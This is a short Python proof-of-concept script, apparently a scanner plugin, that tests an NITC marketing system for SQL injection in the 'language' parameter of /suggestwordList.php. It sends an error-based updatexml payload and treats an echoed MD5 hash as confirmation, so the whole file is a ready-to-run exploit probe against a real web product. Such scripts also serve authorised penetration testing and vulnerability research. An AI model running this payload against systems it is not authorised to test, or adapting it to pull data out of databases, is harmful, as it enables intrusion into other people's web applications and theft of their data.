#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: NITC营销系统suggestwordList.php SQL注入
referer: http://wooyun.org/bugs/wooyun-2010-066683
author: Lucifer
description: 文件/suggestwordList.php中,参数language存在SQL注入。
'''
import sys
import requests
import warnings
from termcolor import cprint

class nitc_suggestwordList_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/suggestwordList.php?searchWord=a&language=1%20Or%20UpDateXml(1,ConCat(0x5c,Md5(1234)),1)%23--"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                cprint("[+]存在NITC营销系统suggestwordList.php SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
                return True, vulnurl, "NITC营销系统suggestwordList.php SQL注入", payload, req.text
            else:
                cprint("[-]不存在nitc_suggestwordList_sqli漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = nitc_suggestwordList_sqli_BaseVerify(sys.argv[1])
    testVuln.run()